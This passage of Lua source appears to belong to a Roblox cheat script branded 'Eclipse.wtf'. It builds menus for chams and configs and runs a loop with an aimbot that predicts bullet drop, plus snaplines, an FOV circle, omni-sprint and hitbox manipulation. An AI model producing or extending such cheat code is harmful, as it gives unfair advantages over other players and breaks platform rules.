                    local_chams_tab:addList({text = "Material:",multiselect = false,values = {"ForceField", "Neon", "CrackedLava", "Glass"},flag = "local_chams_options",callback = function(state)
                        settings.local_chams.material = state
                    end})

                    local_chams_tab:addList({text = "Animation:",multiselect = false,values = {"Galaxy", "Magma", "Stars", "Wave", "Electric", "Hexagon", "Spider Web", "Pixels", "Pulse"},flag = "local_chams_textures_options",callback = function(state)
                        settings.local_chams.textures = texture_animations[state]
                    end})

                    local_chams_tab:addToggle({text = "Weapon",default = false,flag = "weapon_chams_toggle",callback = function(state)
                        settings.weapon_chams.enabled = state
                    end}):addColorpicker({text = "local chams color",ontop = true,flag = "weapon_chams_accent",color = settings.local_chams.color,callback = function(state)
                        settings.weapon_chams.color = state
                    end})

                    local_chams_tab:addSlider({text = "Transparency:", min = 0, max = 100, suffix = "%", float = 1, default = 0, flag = "weapon_transparency_slider",callback = function(state)
                        settings.weapon_chams.transparency = state / 100
                    end})

                    local_chams_tab:addList({text = "Material:",multiselect = false,values = {"ForceField", "Neon", "CrackedLava", "Glass"},flag = "weapon_chams_options",callback = function(state)
                        settings.weapon_chams.material = state
                    end})

                    local_chams_tab:addList({text = "Animation:",multiselect = false,values = {"Galaxy", "Magma", "Stars", "Wave", "Electric", "Hexagon", "Spider Web", "Pixels", "Pulse"},flag = "weapon_chams_textures_options",callback = function(state)
                        settings.weapon_chams.textures = texture_animations[state]
                    end})
                end

                --
                local highlight_chams_tab = Tabs.Local:createGroup('center', 'Highlight Chams')
                
                --// Highlight Chams

                do
                    highlight_chams_tab:addToggle({text = "Enabled",default = false,flag = "highlight_chams_toggle",callback = function(Value)
                        settings.highlight_settings.enabled = Value
                    end}):addColorpicker({text = "highlight chams color",ontop = true,flag = "highlight_chams_accent",color = settings.highlight_settings.highlight_color,callback = function(Value)
                        settings.highlight_settings.highlight_color = Value
                    end})

                    highlight_chams_tab:addToggle({text = "Outline",default = true,flag = "Highlight_Outline_Chams",callback = function(Value)
                    end}):addColorpicker({text = "local chams color",ontop = true,flag = "highlight_chams_accent",color = settings.highlight_settings.outline_color,callback = function(Value)
                        settings.highlight_settings.outline_color = Value
                    end})

                    highlight_chams_tab:addSlider({text = "Fill Transparency:", min = 0, max = 100, suffix = "%", float = 1, default = 100, flag = "highlight_fill_chams_slider",callback = function(Value)
                        settings.highlight_settings.fill_transparency = Value / 100
                    end})

                    highlight_chams_tab:addSlider({text = "Outline Transparency:", min = 0, max = 100, suffix = "%", float = 1, default = 0, flag = "highlight_outline_chams_slider",callback = function(Value)
                        settings.highlight_settings.outline_transparency = Value / 100
                    end})
                end

                ------------------------------------------------------------------------------------------------------------------------------------------------
                --> Miscellaneous -(Seperator)

                --
                local Player_Modifications = {
                    States = {
                        ChangeState = false,
                        Types = "",
                    },
                    Omni_Sprint = {
                        Enabled = false,
                        Speed = 25,
                    },
                }     
                
                ------------------------------------------------------------------------------------------------------------------------------------------------
                --> Settings -(Seperator)

                --
                local Menu_Settings = Tabs.Settings:createGroup('left', 'Menu');local Join_Notifications

                do --// Menu
                    Menu_Settings:addToggle({text = "Menu Bind",default = true,flag = "MenuBind",callback = function(state) end}):addKeybind({text = "Menu Bind",gui = false,type = "toggle",key = Enum.KeyCode.End,flag = "MenuKeybind",callback = function(state) Library.keybind = state end})
                    Menu_Settings:addToggle({text = "Watermark",default = true,flag = "Watermark",callback = function(state) Library.Watermark:SetVisible(state) end}):addColorpicker({text = "watermark color",ontop = true,flag = "Watermark_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(state) Library.Watermark:Color(state) end})
                    Menu_Settings:addToggle({text = "Keybinds",default = true,flag = "Keybinds",callback = function(state) Library:visualize(state) end}):addColorpicker({text = "keybinds color",ontop = true,flag = "Keybinds_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(state) Library:keybind_color(state) end})
                    Menu_Settings:addToggle({text = "Join Notifications",default = true,flag = "Notifications",callback = function(state) Join_Notifications = state end}):addColorpicker({text = "notifications color",ontop = true,flag = "Notifications_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(state) end})
                    Menu_Settings:addList({text = "Position:",multiselect = false,values = {"Top Left", "Top Right", "Top Middle", "Bottom Left", "Bottom rRight"},flag = "Notifications_Position"})
                    Menu_Settings:addSlider({text = "Time:", min = 0, max = 30, suffix = "s", float = 1, default = 15, flag = "Notifications_Time",callback = function(state) end})
                end

                --
                local Game_Settings = Tabs.Settings:createGroup('center', 'Game')

                do --// Game
                    Game_Settings:addToggle({text = "Enabled",default = true,flag = "FPS",callback = function(state) end})
                    Game_Settings:addSlider({text = "Fps Cap:", min = 60, max = 999, suffix = "fps", float = 1, default = 999, flag = "Fps_Slider",callback = function(state) end})    
                    Game_Settings:addToggle({text = "Hide Server Info",default = false,flag = "HideServerInfo",callback = function(state) LocalPlayer.PlayerGui.Main.ServerName.Visible = not state end})
                    Game_Settings:addButton({text = "Copy Join Code",callback = function() setclipboard(("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(game.PlaceId, game.JobId)) Library:Notify("Eclipse.wtf - succesfully copied join code!", 5) end})
                end

                --
                local createconfigs = Tabs.Settings:createGroup('right', 'Configs')

                do --// Config
                    createconfigs:addTextbox({text = "Name:",flag = "config_name"})
                    createconfigs:addButton({text = "Create",callback = Library.createConfig})
                    createconfigs:addConfigbox({flag = 'config_box',values = {}})
                    createconfigs:addButton({text = "Load",callback = Library.loadConfig})
                    createconfigs:addButton({text = "Overwrite",callback = Library.saveConfig})
                    createconfigs:addButton({text = "Delete",callback = Library.deleteConfig})
                end 

                Library:refreshConfigs()
                Library:Notify(string.format("Success: Script loaded in %.2fs", os.clock() - OsClock),15)

                -- << Loops & Functionality >>  
                do
                    local function notifyPlayerChange(player, action)
                        if Join_Notifications then Library:Notify(("Eclipse - %s | %s"):format(player.DisplayName, action), 5, Color3.fromRGB(115, 100, 215)) end
                    end
                    Players.PlayerAdded:Connect(function(player) notifyPlayerChange(player, "joined") end)
                    Players.PlayerRemoving:Connect(function(player) notifyPlayerChange(player, "left") end)  

                    local fov_drawings = {};
                    for i = 1, drawings.fov_circle.sides do
                        fov_drawings[i] = {Drawing.new('Line'), Drawing.new('Line')}
                        fov_drawings[i][1].Thickness = drawings.fov_circle.thickness + 2;
                        fov_drawings[i][2].Thickness = drawings.fov_circle.thickness;
                    end

                    local GunData = {
                        ["Military M4A1"] = {Speed = 2100, Gravity = 0.55},
                        ["Salvaged AK47"] = {Speed = 2100, Gravity = 0.55},
                        ["Salvaged M14"] = {Speed = 2100, Gravity = 0.55},
                        ["Salvaged P250"] = {Speed = 1400, Gravity = 0.6},
                        ["Salvaged Skorpion"] = {Speed = 1600, Gravity = 0.6},
                        ["Salvaged SMG"] = {Speed = 1800, Gravity = 0.6 * 10},
                        ["Salvaged Python"] = {Speed = 1800, Gravity = 0.6},
                        ["Salvaged Pipe Rifle"] = {Speed = 1700, Gravity = 0.6},
                        ["Salvaged AK74u"] = {Speed = 1800, Gravity = 0.6},
                        ["Military PKM"] = {Speed = 2400, Gravity = 0.55},
                        ["Military Barrett"] = {Speed = 2400, Gravity = 0.55},
                        ["Salvaged Break Action"] = {Speed = 550, Gravity = 0.6},
                        ["Military AA12"] = {Speed = 600, Gravity = 0.6},
                        ["Crossbow"] = {Speed = 680, Gravity = 0.2},
                        ["Wooden Bow"] = {Speed = 260, Gravity = 0.2},
                        ["Nail Gun"] = {Speed = 260, Gravity = 0.260},
                        ["None"] = {Speed = 9999, Gravity = 0}
                    }
                    
                    local function GetEquippedItem()
                        for _, v in pairs(game.Workspace.VFX.VMs:GetChildren()) do
                            if v:IsA("Model") then
                                local itemName = tostring(v.Name)
                                local gunData = GunData[itemName]
                                if gunData then
                                    return itemName
                                end
                                return "None"
                            end
                        end
                        return "None"
                    end    
                    
                    utilities.functions.closest_to_mouse = function(type)
                        local target = nil
                        local maxDist = math.huge
                        local localPlayerTeam = LocalPlayer.TeamColor
                        local fovRadius = drawings.fov_circle.enabled and drawings.fov_circle.radius or 0
                        
                        for _, v in ipairs(Players:GetPlayers()) do
                            if v ~= LocalPlayer and v.Character then
                                local humanoid = v.Character:FindFirstChild("Humanoid")
                                local humanoidRootPart = v.Character:FindFirstChild("HumanoidRootPart")
                                local head = v.Character:FindFirstChild("Head")
                                
                                if humanoid and humanoid.Health > 0 and humanoidRootPart and head then
                                    local pos, onScreen = Camera:WorldToViewportPoint(v.Character[aimbot.bone].Position)
                                    if onScreen then
                                        local targetPlayerTeam = v.TeamColor
                                        local distVector = (Vector2.new(pos.X, pos.Y - GuiService.GetGuiInset(GuiService).Y) - Vector2.new(Mouse.X, Mouse.Y))
                                        if LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("HumanoidRootPart") then
                                            local dist = distVector.Magnitude
                                            local distCheck = aimbot.distance == 0 or (v.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude / 3.5714285714 < aimbot.distance
                                            if distCheck and dist <= maxDist and (not localPlayerTeam or not targetPlayerTeam or (not aimbot.teamcheck or targetPlayerTeam ~= localPlayerTeam)) and (not drawings.fov_circle.enabled or dist <= fovRadius) then
                                                maxDist = dist
                                                target = v
                                            end
                                        end
                                    end
                                end
                            end
                        end
                        return target
                    end            
                    
                    UserInputService.InputBegan:Connect(function(input)
                        local toggleFlag = Library.flags["aim_toggle"]
                        if aimbot.enabled and input.UserInputType == toggleFlag then
                            utilities.aimbot.target = utilities.functions.closest_to_mouse("aimbot")
                        end
                    end)
                    
                    UserInputService.InputEnded:Connect(function(input)
                        local toggleFlag = Library.flags["aim_toggle"]
                        if input.UserInputType == toggleFlag then
                            utilities.aimbot.target = nil
                        end
                    end)   

                    --// Create Beam
                    local function CreateBeam(v1, v2)
                        local part1, part2 = Instance.new("Part", workspace), Instance.new("Part", workspace)
                        local attachment1, attachment2 = Instance.new("Attachment", part1), Instance.new("Attachment", part2)
                        local beam = Instance.new("Beam", part1)
                    
                        part1.Size, part2.Size = Vector3.new(1, 1, 1), Vector3.new(1, 1, 1)
                        part1.Transparency, part2.Transparency = 1, 1
                        part1.CanCollide, part2.CanCollide = false, false
                        part1.Anchored, part2.Anchored = true, true
                        part1.CFrame, part2.CFrame = CFrame.new(v1), CFrame.new(v2)
                    
                        beam.FaceCamera = true
                        beam.Attachment0, beam.Attachment1 = attachment1, attachment2
                        beam.LightEmission, beam.LightInfluence = 1, 1
                        beam.TextureMode, beam.TextureLength, beam.TextureSpeed = Enum.TextureMode.Wrap, 20, 1
                        local tracer = inflict_target.hit.tracers
                        if tracer.style == "Color Lerp" then
                            beam.Texture, beam.Color, beam.Width0, beam.Width1 = "rbxassetid://7673521706", ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255))}), 0.1, 0.1
                        elseif tracer.style == "Laser" then
                            beam.Texture, beam.Color, beam.Width0, beam.Width1 = "rbxassetid://5864341017", ColorSequence.new({ColorSequenceKeypoint.new(0, tracer.color), ColorSequenceKeypoint.new(1, tracer.color)}), 0.5, 0.5
                        elseif tracer.style == "Custom" then
                            beam.Texture, beam.Color, beam.Width0, beam.Width1 = "rbxassetid://12781806168", ColorSequence.new({ColorSequenceKeypoint.new(0, tracer.color), ColorSequenceKeypoint.new(1, tracer.color)}), 0.25, 0.25
                        end
                    
                        task.delay(3, function()
                            for i = 0, 1, 0.02 do
                                wait()
                                beam.Transparency = NumberSequence.new(i)
                            end
                            part1:Destroy()
                            part2:Destroy()
                        end)
                    end  

                                
                    local onscreen_text = Drawing.new("Text");
                    onscreen_text.Size = Esp_Settings.Font_Size
                    onscreen_text.Font = Esp_Settings.Font_Family
                    onscreen_text.Center = true
                    onscreen_text.Outline = true
                    onscreen_text.Color = Color3.fromRGB(255, 255, 255)

                    local lines, outlines = {}, {}
                    local time, period, transparencyTime = 0, 1, 3
                    for i = 1, 6 do
                        lines["line"..i] = Drawing.new("Line", drawings.crosshair)
                        if drawings.crosshair.Outline then
                            outlines["outline"..i] = Drawing.new("Line", {Thickness = drawings.crosshair.Thickness + 1, Color = Color3.new(0, 0, 0), Transparency = 1})
                            end
                        end

                        LPH_NO_VIRTUALIZE(function()
                            RunService.RenderStepped:Connect(function(deltaTime)
                            local target = utilities.aimbot.target
                            local ClosestPlayer = utilities.functions.closest_to_mouse("aimbot");
                            if target and target.Character and target.Character:FindFirstChild("Head") then
                                local enemyPos = target.Character[aimbot.bone].Position
                                local myPos = Camera.CFrame.Position
                                local distance = (enemyPos - myPos).Magnitude / 3.5714285714
                                local gunName = GetEquippedItem()
                                local bulletSpeed = GunData[gunName].Speed * distance
                                local bulletGravity = GunData[gunName].Gravity * distance
                                local timeToTarget = distance / bulletSpeed
                                local movePrediction = target.Character.HumanoidRootPart.Velocity * timeToTarget
                                local predictedPos = enemyPos + movePrediction
                                local compensationFactor = 0.5
                                local verticalCompensation = Vector3.new(0, compensationFactor * timeToTarget * bulletGravity, 0)
                                local compensatedPos = predictedPos + verticalCompensation
                                
                                local stepSize = 1
                                local randomDeviation = Vector3.new(
                                    math.random(-aimbot.randomisation, aimbot.randomisation) / 100,
                                    math.random(-aimbot.randomisation, aimbot.randomisation) / 35,
                                    math.random(-aimbot.randomisation, aimbot.randomisation) / 100
                                )
                                local aimPosition = aimbot.autoprediction and compensatedPos or target.Character[aimbot.closestpart and tostring(utilities.functions.get_closest_bone(target)) or aimbot.bone].Position
                                aimPosition = aimPosition + randomDeviation * stepSize
                                Camera.CFrame = aimbot.speed ~= 1 and Camera.CFrame:lerp(CFrame.lookAt(Camera.CFrame.p, aimPosition), aimbot.speed) or CFrame.lookAt(Camera.CFrame.p, aimPosition)
                            end
                            if aimbot.snapline then
                                if ClosestPlayer and ClosestPlayer.Character and ClosestPlayer.Character:FindFirstChild("HumanoidRootPart") and ClosestPlayer.Character:FindFirstChild("Head") then
                                    local snapVector, snapOnScreen = Camera:WorldToViewportPoint(ClosestPlayer.Character[aimbot.snapline_bone].Position)
                                    if snapOnScreen then
                                        Snapline.Visible = true
                                            if aimbot.snapline_from == "Camera" then
                                                Snapline.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                                            elseif aimbot.snapline_from == "Barrel" then
                                                local barrel_screen_pos = from_muzzle()
                                                if barrel_screen_pos then
                                                    Snapline.From = barrel_screen_pos
                                                else
                                                    Snapline.From = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                                                end
                                            else
                                                Snapline.From = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                                            end   
                                        Snapline.To = Vector2.new(snapVector.X, snapVector.Y)
                                    end
                                else
                                    Snapline.Visible = false
                                end
                            else
                                Snapline.Visible = false
                            end
                            if Esp_Settings.Target.Enabled then
                                Esp_Settings.Target.Player = ClosestPlayer
                            else
                                Esp_Settings.Target.Player = nil
                            end
                            if aimbot.onscreen then
                                if ClosestPlayer and ClosestPlayer.Character and ClosestPlayer.Character:FindFirstChild("HumanoidRootPart") and ClosestPlayer.Character:FindFirstChild("Head") then
                                    local humanoid_health = ClosestPlayer.Character:FindFirstChild("Humanoid").Health
                                    local distance = (ClosestPlayer.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude / 3.5714285714
                                    if aimbot.onscreen_position == "Camera" then
                                        onscreen_text.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 1.9)
                                        onscreen_text.Text = ""..ClosestPlayer.Name.." | "..math_round(humanoid_health).."hp/100hp | "..math_round(distance).."m"
                                    elseif aimbot.onscreen_position == "Mouse" then
                                        onscreen_text.Position = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y + 35)
                                        onscreen_text.Text = ""..ClosestPlayer.Name.." | "..math_round(humanoid_health).."hp/100hp | "..math_round(distance).."m"
                                    elseif aimbot.onscreen_position == "Barrel" then
                                        local barrel_screen_pos = from_muzzle()
                                        if barrel_screen_pos then
                                            onscreen_text.Position = barrel_screen_pos
                                        else
                                            onscreen_text.Position = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y + 35)
                                        end
                                        onscreen_text.Text = ""..ClosestPlayer.Name.." | "..math_round(humanoid_health).."hp/100hp | "..math_round(distance).."m"
                                    end
                                else
                                    onscreen_text.Text = ""
                                    onscreen_text.Visible = true
                                end
                            else
                                onscreen_text.Text = ""
                                onscreen_text.Visible = false
                            end                                                                          
                            if Player_Modifications.Omni_Sprint.Enabled then
                                local HRP=LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                                if not HRP or not HRP.Velocity then return end
                                local look_vector=Camera.CFrame.LookVector
                                local keysPressed=UserInputService:GetKeysPressed()
                                local W,A,S,D=false,false,false,false
                                for _,v in ipairs(keysPressed)do if v.KeyCode==Enum.KeyCode.W then W=true elseif v.KeyCode==Enum.KeyCode.A then A=true elseif v.KeyCode==Enum.KeyCode.S then S=true elseif v.KeyCode==Enum.KeyCode.D then D=true end end
                                local function setVelocity(direction,angle) HRP.Velocity=Vector3.new((Camera.CFrame*CFrame.Angles(0,math.rad(angle),0)).LookVector.X*Player_Modifications.Omni_Sprint.Speed,HRP.Velocity.Y,(Camera.CFrame*CFrame.Angles(0,math.rad(angle),0)).LookVector.Z*Player_Modifications.Omni_Sprint.Speed) end
                                if W then if A then setVelocity(look_vector,45) elseif D then setVelocity(look_vector,-45) else setVelocity(look_vector,0) end end
                                if S then if A then setVelocity(look_vector,135) elseif D then setVelocity(look_vector,-135) else setVelocity(look_vector,180) end end
                                if A then setVelocity(look_vector,90) end
                                if D then setVelocity(look_vector,-90) end
                            end    
                            if  Player_Modifications.States.ChangeState then
                                if LocalPlayer.Character and LocalPlayer.Character:WaitForChild("Humanoid") then
                                    LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType[Player_Modifications.States.Types])
                                end
                            else
                                if LocalPlayer.Character and LocalPlayer.Character:WaitForChild("Humanoid") then
                                    LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.None)
                                end
                            end                               
                            if view_model.enabled then
                                local currentCFrame = Camera.CFrame
                                local offset = (currentCFrame.LookVector * view_model.position.Z) + (currentCFrame.RightVector * view_model.position.X) + (currentCFrame.UpVector * view_model.position.Y)
                                Camera.CFrame = currentCFrame + offset
                            end
                            if aspect_ratio.enabled then
                                local currentCFrame = Camera.CFrame
                                if currentCFrame ~= originalCameraCFrame then
                                    local X, Y, Z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = currentCFrame:GetComponents()
                                    Camera.CFrame = CFrame.new(X, Y, Z, R00 * aspect_ratio.horizontal_stretch / 100, R01 * aspect_ratio.vertical_stretch / 100, R02, R10, R11 * aspect_ratio.vertical_stretch / 100, R12, R20 * aspect_ratio.horizontal_stretch / 100, R21 * aspect_ratio.vertical_stretch / 100, R22)
                                end
                            end

                            if drawings.crosshair.Enabled then
                                local MousePos = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                                if drawings.crosshair.Position == "Camera" then
                                    MousePos = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                                elseif drawings.crosshair.Position == "Mouse" then
                                    MousePos = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                                elseif drawings.crosshair.Position == "Barrel" then
                                    local barrel_screen_pos = from_muzzle()
                                    if barrel_screen_pos then
                                        MousePos = barrel_screen_pos
                                    end
                                end
                                local angle = 0
                                if drawings.crosshair.Spin then
                                    local spin_angle = -time * drawings.crosshair.SpinSpeed % drawings.crosshair.SpinMax
                                    angle = TweenService:GetValue(spin_angle / 360, drawings.crosshair.SpinStyle, Enum.EasingDirection.InOut) * 360
                                end
                                for i = 1, 6 do
                                    local line = lines["line"..i]
                                    local t = drawings.crosshair.Fade and math.abs(math.sin(time * math.pi / transparencyTime)) or 1
                                    line.Visible = drawings.crosshair.Arms or i <= 2
                                    line.Color = drawings.crosshair.Color
                                    line.Transparency = drawings.crosshair.Transparency - (drawings.crosshair.Fade and t * drawings.crosshair.FadeSpeed or 0)
                                    line.Thickness = drawings.crosshair.Thickness
                                    if drawings.crosshair.Outline then
                                        local outline = outlines["outline"..i]
                                        outline.Visible = drawings.crosshair.Arms or i <= 2
                                        local relatedLine = lines["line"..i]
                                        outline.From, outline.To = relatedLine.From, relatedLine.To
                                        outline.Thickness = drawings.crosshair.Thickness + 1
                                        outline.Transparency = drawings.crosshair.Transparency - (drawings.crosshair.Fade and t * drawings.crosshair.FadeSpeed or 0)
                                        outline.ZIndex = -1
                                    else
                                        local outline = outlines["outline"..i]
                                        outline.Visible = false
                                    end
                                end
                                local t = 0.25 / drawings.crosshair.SpinSpeed
                                local cosAngle, sinAngle = math.cos(math.rad(angle)), math.sin(math.rad(angle))
                                local rotate = function(point)
                                    return Vector2.new(MousePos.X + (point.X - MousePos.X) * cosAngle - (point.Y - MousePos.Y) * sinAngle, MousePos.Y + (point.X - MousePos.X) * sinAngle + (point.Y - MousePos.Y) * cosAngle)
                                end
                                local starty1, endy1, startx1, endx1 = Vector2.new(MousePos.X, MousePos.Y - drawings.crosshair.Length), Vector2.new(MousePos.X, MousePos.Y + drawings.crosshair.Length), Vector2.new(MousePos.X - drawings.crosshair.Length, MousePos.Y), Vector2.new(MousePos.X + drawings.crosshair.Length, MousePos.Y)
                                local starty12, endy12, startx12, endx12 = rotate(starty1 + Vector2.new(drawings.crosshair.Length, 0)), rotate(endy1 - Vector2.new(drawings.crosshair.Length, 0)), rotate(startx1 - Vector2.new(0, drawings.crosshair.Length)), rotate(endx1 + Vector2.new(0, drawings.crosshair.Length))
                                lines.line1.From, lines.line1.To = rotate(endy1), rotate(starty1)
                                lines.line2.From, lines.line2.To = rotate(endx1), rotate(startx1)
                                lines.line3.From, lines.line3.To = rotate(starty1 - Vector2.new(t, 0)), starty12
                                lines.line4.From, lines.line4.To = rotate(endy1 + Vector2.new(t, 0)), endy12
                                lines.line5.From, lines.line5.To = rotate(startx1 + Vector2.new(0, t)), startx12
                                lines.line6.From, lines.line6.To = rotate(endx1 - Vector2.new(0, t)), endx12
                    
                                if drawings.crosshair.Resize then
                                    drawings.crosshair.Length = drawings.crosshair.ResizeMin + math.sin(time * math.pi * drawings.crosshair.ResizeSpeed / period) * (drawings.crosshair.ResizeMax - drawings.crosshair.ResizeMin)
                                end
                    
                                time = time + deltaTime
                            else
                                for _, line in pairs(lines) do 
                                    line.Visible = false 
                                end 
                                if drawings.crosshair.Outline then 
                                    for _, outline in pairs(outlines) do 
                                        outline.Visible = false 
                                    end 
                                end    
                            end 
                                          
                            for i = 1, #fov_drawings do
                                local behind, front = fov_drawings[i][1], fov_drawings[i][2]
                                if drawings.fov_circle.enabled then
                                    local radius
                                    if drawings.fov_circle.dynamic then 
                                        local fovScalingFactor = 0.65 / math.tan(math.rad(Camera.FieldOfView / 2)) 
                                        radius = fovScalingFactor * drawings.fov_circle.radius
                                    else
                                        radius = drawings.fov_circle.radius
                                    end
                                    local color
                                    if drawings.fov_circle.animated == "Static" then
                                        color = drawings.fov_circle.color
                                    elseif drawings.fov_circle.animated == "Rainbow" then
                                        color = Color3.fromHSV((tick() % 3 / 3 - (i / #fov_drawings)) % 1, 0.35, 1)
                                    else
                                        local hue = (tick() % (1.2 * drawings.fov_circle.animation_speed) / (1.2 * drawings.fov_circle.animation_speed) - (i / #fov_drawings)) % 1
                                        if drawings.fov_circle.animated == "Animated" and hue < 0.5 then
                                            local t = hue / 0.5 
                                            color = Color3.new(t * drawings.fov_circle.color.R, t * drawings.fov_circle.color.G, t * drawings.fov_circle.color.B) 
                                        else
                                            local t = (hue - 0.5) / 0.5 
                                            color = Color3.new((1 - t) * drawings.fov_circle.color.R, (1 - t) * drawings.fov_circle.color.G, (1 - t) * drawings.fov_circle.color.B)
                                        end
                                    end
                                    local pos
                                    if drawings.fov_circle.position == "Camera" then
                                        pos = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                                    elseif drawings.fov_circle.position == "Barrel" then
                                        local barrel_screen_pos = from_muzzle()
                                        pos = barrel_screen_pos or Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                                    else
                                        pos = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                                    end
                                    local last, next = (i / drawings.fov_circle.sides) * math.pi * 2, ((i + 1) / drawings.fov_circle.sides) * math.pi * 2
                                    local lastX, lastY = pos.X + math.cos(last) * radius, pos.Y + math.sin(last) * radius
                                    local nextX, nextY = pos.X + math.cos(next) * radius, pos.Y + math.sin(next) * radius
                                    behind.Visible = drawings.fov_circle.outline
                                    if behind.Visible then 
                                        behind.From = Vector2.new(lastX, lastY)
                                        behind.To = Vector2.new(nextX, nextY)
                                        behind.Color = Color3.new(0, 0, 0)
                                        behind.Transparency = drawings.fov_circle.circleTransparency
                                        behind.Thickness = drawings.fov_circle.thickness + 2
                                    end
                                    front.From = Vector2.new(lastX, lastY)
                                    front.To = Vector2.new(nextX, nextY)
                                    front.Color = color
                                    front.Transparency = drawings.fov_circle.circleTransparency
                                    front.Thickness = drawings.fov_circle.thickness
                                    front.Visible = true
                                else 
                                    front.Visible = false
                                    behind.Visible = false
                                end
                            end                            

                            if weapon_modifications.silent_farm then
                                for _, v in pairs(workspace.Trees:GetChildren()) do
                                    local treeXMain = v:FindFirstChild("TreeX") and v.TreeX:FindFirstChild("Main")
                                    local main = v:FindFirstChild("Main")
                            
                                    if treeXMain and main and treeXMain:FindFirstChild("X") then
                                        treeXMain.Size, treeXMain.CFrame, treeXMain.X.Transparency = main.Size, main.CFrame, 1
                                    end
                                end
                            
                                for _, v in pairs(workspace.Nodes:GetChildren()) do
                                    local nodesXMain = v:FindFirstChild("NodeSpark") and v.NodeSpark:FindFirstChild("Main")
                                    local nodes_main = v:FindFirstChild("Main")
                            
                                    if nodesXMain and nodes_main then
                                        nodesXMain.Size = nodes_main.Size
                                        if nodes_main:IsA("BasePart") and nodesXMain:IsA("BasePart") then
                                            nodesXMain.CFrame = nodes_main.CFrame
                                        end
                                    end
                                end                                                       
                            end
                            
                            if settings.local_chams.enabled or settings.weapon_chams.enabled or settings.highlight_settings.enabled then
                                for _, v in ipairs(game.Workspace.VFX.VMs:GetChildren()) do
                                    if v:IsA("Model") then
        
                                        if settings.highlight_settings.enabled then
                                            sethiddenproperty(v.Highlight, "OutlineColor", settings.highlight_settings.outline_color) 
                                            sethiddenproperty(v.Highlight, "FillTransparency", settings.highlight_settings.fill_transparency) 
                                            sethiddenproperty(v.Highlight, "FillColor", settings.highlight_settings.highlight_color) 
                                            sethiddenproperty(v.Highlight, "OutlineTransparency", settings.highlight_settings.outline_transparency) 
                                        end
                        
                                        local armsFolder = v:FindFirstChild("Arms")
                                        local weaponFolder = v:FindFirstChild("Weapon")
                                        if settings.local_chams.enabled and armsFolder then
                                            local hasSleeveOrGlove = false
                                            for _, arm in ipairs(armsFolder:GetDescendants()) do
                                                if arm:IsA("MeshPart") then
                                                    if (arm.Name == "Sleeve" or arm.Name == "Glove") then
                                                        arm.Material = settings.local_chams.material
                                                        sethiddenproperty(arm, "TextureID", settings.local_chams.material == "ForceField" and settings.local_chams.textures)
                                                        sethiddenproperty(arm, "Color", settings.local_chams.color)
                                                        sethiddenproperty(arm, "Transparency", settings.local_chams.transparency)
                                                        hasSleeveOrGlove = true
                                                    end
                                                end
                                            end
                                            if not hasSleeveOrGlove then
                                                for _, arm in ipairs(armsFolder:GetDescendants()) do
                                                    if arm:IsA("MeshPart") then
                                                        if (arm.Name == "LeftArm" or arm.Name == "RightArm") then
                                                            arm.Material = settings.local_chams.material
                                                            sethiddenproperty(arm, "TextureID", settings.local_chams.material == "ForceField" and settings.local_chams.textures)
                                                            sethiddenproperty(arm, "Color", settings.local_chams.color)
                                                            sethiddenproperty(arm, "Transparency", settings.local_chams.transparency)
                                                        end
                                                    end
                                                end
                                            end
                                        end                                                            
                                        if settings.weapon_chams.enabled and weaponFolder then
                                            for _, weaponPart in ipairs(weaponFolder:GetDescendants()) do
                                                if weaponPart:IsA("MeshPart") and weaponPart.Transparency ~= 1 then
                                                    sethiddenproperty(weaponPart, "TextureID", settings.weapon_chams.material == "ForceField" and settings.weapon_chams.textures)
                                                    sethiddenproperty(weaponPart, "Material", settings.weapon_chams.material)
                                                    sethiddenproperty(weaponPart, "Color", settings.weapon_chams.color)
                                                    sethiddenproperty(weaponPart, "Transparency", settings.weapon_chams.transparency)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end)
                    end)()
                end
            end
        end
    end
--]==])
